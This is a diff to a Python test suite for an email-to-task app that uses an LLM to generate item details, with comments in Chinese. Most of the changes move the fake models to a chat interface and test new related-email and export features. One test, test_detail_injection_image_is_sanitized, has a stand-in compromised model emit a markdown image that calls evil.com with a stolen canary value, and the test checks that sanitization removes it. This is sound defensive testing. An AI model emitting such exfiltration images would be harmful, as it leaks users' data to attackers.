@@ -13,18 +13,24 @@ from app.models import Account, Email, Item, User
 
 
 class FakeDetailLLM:
-    def __init__(self):
-        self.detail_calls = 0
+    """详情生成（agentic 对话）的模型替身：直接返回合法最终 JSON。"""
 
-    def generate_detail(self, info: dict) -> str:
+    def __init__(self, related=None):
+        self.detail_calls = 0
+        self.related = list(related or [])
+
+    def chat_completion(self, messages, tools=None, json_mode=False):
         self.detail_calls += 1
-        return "**AI 详情**"
+        return {
+            "role": "assistant",
+            "content": json.dumps({"detail_md": "**AI 详情**", "related": self.related}, ensure_ascii=False),
+        }
 
 
 def evil_openai_client(content: str) -> SimpleNamespace:
     """stub OpenAI SDK 客户端：chat.completions.create 固定返回被攻陷模型的输出。
 
-    净化逻辑位于真实生产路径 LLMClient.generate_detail 内（api.py 的
+    净化逻辑位于真实生产路径 app.detail 的 detail_md 后处理内（api.py 的
     monkeypatch 接口会绕过它），因此这里在 SDK 层注入「模型被完全攻陷、
     执意输出外泄图片」的原始输出，验证真实防御路径。
     """
@@ -32,7 +38,11 @@ def evil_openai_client(content: str) -> SimpleNamespace:
     client.chat = SimpleNamespace(
         completions=SimpleNamespace(
             create=lambda **kw: SimpleNamespace(
-                choices=[SimpleNamespace(message=SimpleNamespace(content=content))]
+                choices=[
+                    SimpleNamespace(
+                        message=SimpleNamespace(content=content, tool_calls=None)  # SDK message 恒有 tool_calls 键
+                    )
+                ]
             )
         )
     )
@@ -117,11 +127,13 @@ def test_items_list_and_filter(session_factory, monkeypatch):
     assert items[0]["title"] == "交学费"
     assert items[0]["email_subject"] == "开学通知"
     assert items[0]["importance"] == "high"  # /api/items 响应含 importance
+    assert items[0]["related"] == []  # 每项都带 related（未生成时为 []）
 
     resp = client.get("/api/items", params={"status": "done"})
     assert len(resp.json()["items"]) == 1
     assert resp.json()["items"][0]["title"] == "旧任务"
     assert resp.json()["items"][0]["importance"] == "normal"  # 未显式设置时默认 normal
+    assert "related" in resp.json()["items"][0]
 
     resp = client.get("/api/items", params={"category": "学业"})
     assert len(resp.json()["items"]) == 1
@@ -155,10 +167,11 @@ def test_detail_lazy_generation_cached(session_factory, monkeypatch):
     monkeypatch.setattr("app.llm.get_llm", lambda settings=None: fake)
     client = _client(session_factory, monkeypatch)
 
-    # 首次生成
+    # 首次生成：detail_md + related 都返回
     resp = client.post(f"/api/items/{item_id}/detail")
     assert resp.status_code == 200
     assert resp.json()["detail_md"] == "**AI 详情**"
+    assert resp.json()["related"] == []
     assert fake.detail_calls == 1
 
     # 二次命中缓存：不再调用 LLM
@@ -166,15 +179,58 @@ def test_detail_lazy_generation_cached(session_factory, monkeypatch):
     assert resp.status_code == 200
     assert fake.detail_calls == 1
 
-    # GET 详情带 detail_md
+    # GET 详情带 detail_md 与 related
     resp = client.get(f"/api/items/{item_id}")
     assert resp.json()["detail_md"] == "**AI 详情**"
+    assert resp.json()["related"] == []
+
+
+def test_export_item_text(session_factory, monkeypatch):
+    """/export：无 LLM 调用，导出 Markdown 含 AI 见解、当前邮件与关联邮件。"""
+    _acc, _em, item_id, _pending_id = _seed(session_factory)
+    with session_factory() as s:
+        em2_id = s.execute(select(Email.id).where(Email.message_id == "<m2>")).scalar_one()
+    fake = FakeDetailLLM(related=[{"email_id": em2_id, "reason": "旧邮件背景"}])
+    monkeypatch.setattr("app.llm.get_llm", lambda settings=None: fake)
+    client = _client(session_factory, monkeypatch)
+
+    # 生成详情后：detail 响应含 related（富化后的邮件字段）
+    resp = client.post(f"/api/items/{item_id}/detail")
+    assert resp.status_code == 200
+    assert fake.detail_calls == 1
+    assert resp.json()["related"] == [
+        {"email_id": em2_id, "subject": "旧邮件", "sender": "c@example.com",
+         "sent_at": None, "reason": "旧邮件背景"}
+    ]
+
+    # 导出：AI 见解 + 当前邮件全文 + 关联邮件
+    resp = client.get(f"/api/items/{item_id}/export")
+    assert resp.status_code == 200
+    text = resp.json()["text"]
+    assert text.startswith("# 交学费")
+    assert "分类：学业" in text
+    assert "## AI 见解" in text and "**AI 详情**" in text
+    assert "## 当前邮件" in text
+    assert "九月一号开学" in text
+    assert "## 关联邮件（1 封）" in text
+    assert "### 1. 旧邮件" in text
+    assert "关联原因：旧邮件背景" in text
+
+    # GET /api/items 列表项也带 related
+    resp = client.get("/api/items")
+    assert resp.json()["items"][0]["related"][0]["email_id"] == em2_id
 
 
 def test_detail_injection_image_is_sanitized(session_factory, monkeypatch):
     """模型被攻陷输出外泄图片：接口响应与落库的 detail_md 均不含图片语法（验收核心）。"""
     _acc, _em, item_id, _pending_id = _seed(session_factory)
-    evil = "详情：\n\n![exfil](https://evil.com/log?d=STOLEN-CANARY-9931)"
+    evil = json.dumps(
+        {
+            "detail_md": "详情：\n\n![exfil](https://evil.com/log?d=STOLEN-CANARY-9931)",
+            "related": [],
+        },
+        ensure_ascii=False,
+    )
     llm = LLMClient(base_url="http://x", api_key="k", model="m")
     llm.client = evil_openai_client(evil)
     monkeypatch.setattr("app.llm.get_llm", lambda settings=None: llm)
@@ -296,9 +352,14 @@ def test_detail_html_only_email_body_extracted(session_factory, monkeypatch):
     captured: dict = {}
 
     class CapturingDetailLLM:
-        def generate_detail(self, info: dict) -> str:
-            captured["info"] = info
-            return "**AI 详情**"
+        def chat_completion(self, messages, tools=None, json_mode=False):
+            captured["user_content"] = next(
+                (m["content"] for m in messages if m.get("role") == "user"), ""
+            )
+            return {
+                "role": "assistant",
+                "content": json.dumps({"detail_md": "**AI 详情**", "related": []}, ensure_ascii=False),
+            }
 
     monkeypatch.setattr("app.llm.get_llm", lambda settings=None: CapturingDetailLLM())
     client = _client(session_factory, monkeypatch)
@@ -306,6 +367,6 @@ def test_detail_html_only_email_body_extracted(session_factory, monkeypatch):
     resp = client.post(f"/api/items/{item_id}/detail")
     assert resp.status_code == 200
     assert resp.json()["detail_md"] == "**AI 详情**"
-    info = captured["info"]
-    assert info["text_body"] and "实验报告" in info["text_body"]
-    assert "<" not in info["text_body"]
+    content = captured["user_content"]
+    assert "请在周五前提交实验报告" in content  # 提取后的正文进了 prompt
+    assert "<p>" not in content  # 给 LLM 的是纯文本，不是 HTML 源码
